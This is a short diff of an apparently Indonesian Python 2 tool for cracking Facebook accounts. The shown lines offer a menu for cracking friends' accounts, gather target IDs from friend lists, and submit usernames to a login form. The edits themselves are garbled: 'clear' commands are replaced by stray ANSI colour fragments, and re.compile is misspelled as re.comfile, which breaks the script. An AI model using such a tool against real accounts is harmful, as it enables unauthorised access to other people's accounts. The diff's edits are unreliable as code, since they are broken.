@@ -219,7 +219,7 @@ def super():
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		keluar()
-	os.system('clear')
+	os.system('[1;96m="')
 	print logo
 	print 42*"\033[1;96m="
 	print "\x1b[1;97m1.\x1b[1;93m Crack dari daftar teman"
@@ -234,7 +234,7 @@ def pilih_super():
 		print "\033[1;96m[!] \x1b[1;91mHarap Isi Dengan benar"
 		pilih_super()
 	elif peak =="1":
-		os.system('clear')
+		os.system('42*"\033[1;96m=" ')
 		print logo
 		print 42*"\033[1;96m="
 		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
@@ -243,7 +243,7 @@ def pilih_super():
 		for s in z['data']:
 			id.append(s['id'])
 	elif peak =="2":
-		os.system('clear')
+		os.system('  42*"\033[1;96m=" ')
 		print logo
 		print 42*"\033[1;96m="
 		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
@@ -279,7 +279,7 @@ os.system('clear')
 		for p in s['data']:
 			id.append(p['id'])
 	elif peak =="4":
-		os.system('clear')
+		os.system('42*"\033[1;96m=" ')
 		print logo
 		print 42*"\033[1;96m="
 		try:
@@ -759,7 +759,7 @@ mpsh = []
 			br.select_form(nr=0)
 			br["username"] = mail
 			klik = br.submit().read()
-			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+			jok = re.comfile(r'"messages.ERROR_INVALID_USERNAME">.*')
 			try:
 pek = jok.search(klik).group()
 			except:
